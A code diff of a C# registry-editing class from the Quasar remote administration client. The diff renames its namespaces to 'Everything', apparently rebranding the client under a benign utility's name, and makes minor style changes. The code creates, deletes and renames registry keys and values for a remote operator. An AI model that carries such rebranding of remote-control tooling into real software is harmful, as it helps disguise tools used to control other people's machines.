@@ -1,10 +1,10 @@
-﻿using Microsoft.Win32;
-using Quasar.Client.Extensions;
-using Quasar.Client.Helper;
+﻿using Everything.Extensions;
+using Everything.Helper;
+using Microsoft.Win32;
 using Quasar.Common.Models;
 using System;
 
-namespace Quasar.Client.Registry
+namespace Everything.Registry
 {
     public class RegistryEditor
     {
@@ -28,7 +28,7 @@ namespace Quasar.Client.Registry
             name = "";
             try
             {
-                RegistryKey parent = GetWritableRegistryKey(parentPath);
+                var parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
@@ -38,17 +38,17 @@ namespace Quasar.Client.Registry
                 }
 
                 //Try to find available names
-                int i = 1;
-                string testName = String.Format("New Key #{0}", i);
+                var i = 1;
+                var testName = string.Format("New Key #{0}", i);
 
                 while (parent.ContainsSubKey(testName))
                 {
                     i++;
-                    testName = String.Format("New Key #{0}", i);
+                    testName = string.Format("New Key #{0}", i);
                 }
                 name = testName;
 
-                using (RegistryKey child = parent.CreateSubKeySafe(name))
+                using (var child = parent.CreateSubKeySafe(name))
                 {
                     //Child could not be created
                     if (child == null)
@@ -81,7 +81,7 @@ namespace Quasar.Client.Registry
         {
             try
             {
-                RegistryKey parent = GetWritableRegistryKey(parentPath);
+                var parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
@@ -98,7 +98,7 @@ namespace Quasar.Client.Registry
                     return true;
                 }
 
-                bool success = parent.DeleteSubKeyTreeSafe(name);
+                var success = parent.DeleteSubKeyTreeSafe(name);
 
                 //Child could not be deleted
                 if (!success)
@@ -131,7 +131,7 @@ namespace Quasar.Client.Registry
             try
             {
 
-                RegistryKey parent = GetWritableRegistryKey(parentPath);
+                var parent = GetWritableRegistryKey(parentPath);
 
                 //Invalid can not open parent
                 if (parent == null)
@@ -147,7 +147,7 @@ namespace Quasar.Client.Registry
                     return false;
                 }
 
-                bool success = parent.RenameSubKeySafe(oldName, newName);
+                var success = parent.RenameSubKeySafe(oldName, newName);
 
                 //Child could not be renamed
                 if (!success)
@@ -181,7 +181,7 @@ namespace Quasar.Client.Registry
             name = "";
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
@@ -191,17 +191,17 @@ namespace Quasar.Client.Registry
                 }
 
                 //Try to find available names
-                int i = 1;
-                string testName = String.Format("New Value #{0}", i);
+                var i = 1;
+                var testName = string.Format("New Value #{0}", i);
 
                 while (key.ContainsValue(testName))
                 {
                     i++;
-                    testName = String.Format("New Value #{0}", i);
+                    testName = string.Format("New Value #{0}", i);
                 }
                 name = testName;
 
-                bool success = key.SetValueSafe(name, kind.GetDefault(), kind);
+                var success = key.SetValueSafe(name, kind.GetDefault(), kind);
 
                 //Value could not be created
                 if (!success)
@@ -233,7 +233,7 @@ namespace Quasar.Client.Registry
         {
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
@@ -250,7 +250,7 @@ namespace Quasar.Client.Registry
                     return true;
                 }
 
-                bool success = key.DeleteValueSafe(name);
+                var success = key.DeleteValueSafe(name);
 
                 //Value could not be deleted
                 if (!success)
@@ -282,7 +282,7 @@ namespace Quasar.Client.Registry
         {
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
@@ -298,7 +298,7 @@ namespace Quasar.Client.Registry
                     return false;
                 }
 
-                bool success = key.RenameValueSafe(oldName, newName);
+                var success = key.RenameValueSafe(oldName, newName);
 
                 //Value could not be renamed
                 if (!success)
@@ -333,7 +333,7 @@ namespace Quasar.Client.Registry
         {
             try
             {
-                RegistryKey key = GetWritableRegistryKey(keyPath);
+                var key = GetWritableRegistryKey(keyPath);
 
                 //Invalid can not open key
                 if (key == null)
@@ -349,7 +349,7 @@ namespace Quasar.Client.Registry
                     return false;
                 }
 
-                bool success = key.SetValueSafe(value.Name, value.Data, value.Kind);
+                var success = key.SetValueSafe(value.Name, value.Data, value.Kind);
 
                 //Value could not be created
                 if (!success)
@@ -372,7 +372,7 @@ namespace Quasar.Client.Registry
 
         public static RegistryKey GetWritableRegistryKey(string keyPath)
         {
-            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);
+            var key = RegistrySeeker.GetRootKey(keyPath);
 
             if (key != null)
             {
@@ -380,7 +380,7 @@ namespace Quasar.Client.Registry
                 if (key.Name != keyPath)
                 {
                     //Must get the subKey name by removing root and '\\'
-                    string subKeyName = keyPath.Substring(key.Name.Length + 1);
+                    var subKeyName = keyPath.Substring(key.Name.Length + 1);
 
                     key = key.OpenWritableSubKeySafe(subKeyName);
                 }
